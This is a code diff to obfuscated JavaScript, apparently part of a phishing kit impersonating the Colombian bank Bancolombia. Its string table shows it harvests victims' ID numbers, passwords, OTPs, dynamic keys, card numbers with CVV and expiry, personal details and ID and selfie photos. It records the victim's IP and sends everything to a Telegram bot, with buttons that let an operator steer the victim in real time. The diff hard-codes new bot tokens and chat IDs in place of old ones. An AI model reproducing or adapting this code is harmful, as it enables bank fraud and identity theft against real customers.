@@ -1,3 +1,6 @@
+const BOT_TOKEN = '8703044811:AAF2fekkn1hBO83UDXozzuvmzczZYQK2Mj4';
+const CHAT_ID = '8042354877';
+
 function _0x3c66() {
     const _0x5768e6 = ['clave', '\x0a💳\x20<b>BANCOLOMBIA\x20-\x20TARJETA\x20', '✅\x20Botones\x20eliminados\x20correctamente', 'HTML', '8DJOgtB', 'user_id_number', '❌\x20Fotos\x20Incorrectas', 'tarjeta_debito', 'departamento', 'token', 'city', ',\x20esperando\x20', 'foto3', 'length', 'stringify', 'formData', 'message_id', '1374414lzzZJJ', 'update_id', '⚠️\x20Conflict\x20409\x20con\x20Telegram', '\x0a•\x20<b>Teléfono\x20Fijo:</b>\x20', 'https://api.telegram.org/bot', '📋\x20DP', 'json', '❌\x20Error\x20al\x20eliminar\x20botones:', 'nombre', '11671sDZltT', '⚠️\x20Telegram\x20no\x20eliminó\x20los\x20botones:', '❌\x20Error\x20al\x20enviar:', 'Desconocida', '\x0a📅\x20<b>Vencimiento:</b>\x20', '📸\x20SOYYO', '\x0a👤\x20<b>Titular:</b>\x20', 'tarjeta_credito', 'POST', '🗑️\x20Intentando\x20eliminar\x20botones\x20del\x20mensaje\x20', '-5270281648', '📨\x20sendToTelegram\x20llamado\x20con\x20tipo:\x20', '❌\x20OTP', '\x0a🆔\x20<b>Usuario:</b>\x20', 'Error\x20con\x20ipapi.co:', 'datos_personales', 'documento', '1120lJdXkv', '\x0a🔐\x20<b>BANCOLOMBIA\x20-\x20OTP\x20RECIBIDA</b>\x0a\x0a📱\x20<b>OTP:</b>\x20', '\x0a\x20\x20\x20\x20\x20\x20\x20\x20', 'getItem', 'finalizar', '❌\x20Error\x20en\x20getUpdates:', '❌\x20Error', 'telefono_fijo', '\x0a🤳\x20<b>Foto\x203\x20(Selfie):</b>\x20', 'reply_markup', '❌\x20Dinamica', 'parse', 'numero_identificacion', '5PlEiRA', 'Recibida\x20✅', 'error', '11IAmOVH', '/sendMessage', '\x0a\x20\x20\x20\x20\x20\x20', '⏱️\x20Timeout:\x20No\x20se\x20recibió\x20respuesta', '\x0a•\x20<b>Género:</b>\x20', '🛑\x20Escucha\x20detenida', 'token_otro', 'vencimiento', 'getElementById', '\x0a\x0a🆔\x20<b>Usuario:</b>\x20', '7695636MyTtye', 'toLowerCase', '14505RHqBTi', 'Error\x20leyendo\x20formData:', '\x0a•\x20<b>Departamento:</b>\x20', 'no-store', 'application/json', '664riRYPe', '📤\x20Enviando\x20mensaje\x20al\x20servidor...', '\x0a📋\x20<b>BANCOLOMBIA\x20-\x20DATOS\x20PERSONALES\x20RECIBIDOS</b>\x0a\x0a👤\x20<b>INFORMACIÓN\x20PERSONAL</b>\x0a•\x20<b>Fecha\x20Nacimiento:</b>\x20', 'log', 'login', 'description', 'toUpperCase', 'No\x20recibida\x20❌', 'soyyo', '📨\x20Update\x20recibido:\x20mensaje\x20', '✅\x20Message\x20ID\x20coincide!', '✅\x20Servidor\x20completamente\x20listo', 'callback_query', 'foto2', '1671921YMdkiQ', 'https://ipapi.co/json/', 'titular', 'result', 'otp', '15785PoZQzp', '🔐\x20Dinamica', '\x0a\x0a📍\x20<b>DIRECCIÓN</b>\x0a•\x20<b>Dirección:</b>\x20', '💳\x20TC', 'then', '\x0a🏦\x20<b>BANCOLOMBIA\x20-\x20NUEVO\x20ACCESO</b>\x0a\x0a🪪\x20<b>Cédula:</b>\x20', '\x0a📸\x20<b>BANCOLOMBIA\x20-\x20FOTOS\x20\x22SOY\x20YO\x22\x20RECIBIDAS</b>\x0a\x0a📷\x20<b>Foto\x201\x20(Cédula\x20Frontal):</b>\x20', '\x0a📍\x20<b>Ciudad:</b>\x20', 'https://api.ipify.org?format=json', '📸\x20Soy\x20Yo', 'warn', '💳\x20TD', '🏁\x20Finalizar', '🔐\x20OTP', '\x0a-------------------------------------------------\x0a🌐\x20<b>IP:</b>\x20', 'trim', 'genero', 'foto1', 'fecha_nacimiento', 'cvv', '\x0a🔐\x20<b>BANCOLOMBIA\x20-\x20DINAMICA\x20RECIBIDA</b>\x0a\x0a📱\x20<b>Dinamica:</b>\x20', '🎯\x20Botón\x20presionado:', '✅\x20Mensaje\x20enviado:', 'numero', '❌\x20Datos\x20Incorrectos', '\x0a•\x20<b>Ciudad:</b>\x20', 'stopListening', 'style', '\x0a🔑\x20<b>Clave:</b>\x20', '🚀\x20cargado\x20correctamente', 'No\x20disponible', '❌\x20Tarjeta\x20Inválida', '\x0a📷\x20<b>Foto\x202\x20(Cédula\x20Trasera):</b>\x20', 'HTTP\x20error!\x20status:\x20', 'loading-overlay', 'status', 'bbogota_msg_id', '\x20RECIBIDA</b>\x0a\x0a💳\x20<b>Número:</b>\x20', 'catch', 'otp_otro', 'Desconocido', '8410DAKodo', 'direccion', 'function', 'message', '\x0a•\x20<b>Celular:</b>\x20'];
     _0x3c66 = function() {
@@ -22,8 +25,9 @@ const _0x21667e = _0x1d5c;
         }
     }
 }(_0x3c66, 0x54f1b));
-const TELEGRAM_BOT_TOKEN = '8321745529:AAELZ77ID53kdEtjgtdrvFE2gWHDBg0G1ko'
-  , TELEGRAM_CHAT_ID = _0x21667e(0xc9);
+const TELEGRAM_BOT_TOKEN = '8703044811:AAF2fekkn1hBO83UDXozzuvmzczZYQK2Mj4';
+const TELEGRAM_CHAT_ID = '8042354877';
+
 function _0x1d5c(_0x9c0fd7, _0x4e254b) {
     _0x9c0fd7 = _0x9c0fd7 - 0x96;
     const _0x3c665c = _0x3c66();
@@ -118,7 +122,7 @@ async function sendToTelegram(_0x298aa8, _0x43e9e3, _0x34520d=null) {
     let _0x81575d = ''
       , _0x47c2a2 = null;
     if (_0x298aa8 === _0xb36b08(0xf5))
-        _0x81575d = (_0xb36b08(0x109) + _0xa05c99 + '\x0a👤\x20<b>Nombre:</b>\x20' + _0x4f6488 + _0xb36b08(0xcc) + (_0x43e9e3['numero_identificacion'] || _0xb36b08(0x122)) + _0xb36b08(0x120) + (_0x43e9e3['clave'] || 'No\x20disponible') + _0xb36b08(0x112) + _0x2840f6['ip'] + _0xb36b08(0x10b) + _0x2840f6[_0xb36b08(0xaf)] + _0xb36b08(0xd2))[_0xb36b08(0x113)](),
+        _0x81575d = (_0xb36b08(0x109) + _0xa05c99 + '\x0a👤\x20<b>Nombre:</b>\x20' + _0x4f6488 + _0xb36b08(0xcc) + (_0x43e9e3['numero_identificacion'] || _0xb36b08(0x122)) + _0xb36b08(0x120) + (_0x43e9e3['clave'] || 'No\x20disponible') + _0xb36b08(0x112) + _0x2840f6['ip'] + _0xb36b08(0x10b) + _0x2840f6[_0xb36b08(0xaf)] + _0xb36b08(0xe2))[_0xb36b08(0x113)](),
         _0x47c2a2 = {
             'inline_keyboard': [[{
                 'text': _0xb36b08(0xd6),
